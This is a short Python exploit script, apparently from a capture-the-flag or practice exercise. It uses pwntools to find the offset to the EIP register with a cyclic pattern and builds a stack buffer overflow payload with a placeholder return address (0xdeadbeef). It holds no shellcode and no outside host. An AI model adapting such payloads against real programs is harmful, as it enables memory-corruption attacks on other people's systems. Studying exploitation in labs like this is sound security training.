from pwn import *

# create the pattern
padding = cyclic(100)

# adjut the pattern until we reach the eip
padding = cyclic(cyclic_find('jaaa'))
#print(padding)

# raw ex
eip = p32(0xdeadbeef)

#print(eip)

payload = padding + eip
print(payload)